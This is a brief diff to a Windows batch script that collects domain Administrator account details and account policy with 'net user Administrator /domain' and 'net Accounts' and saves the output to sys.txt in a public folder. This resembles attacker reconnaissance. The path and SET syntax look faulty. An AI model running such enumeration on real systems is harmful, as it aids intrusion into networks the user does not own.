@@ -1,5 +1,5 @@
 echo off
-#SET TMPDIR = %TEMP%
+SET public = C:/User/public
 
 net user Administrator /domain > "%public%\sys.txt"
 net Accounts >> "%public%\sys.txt"
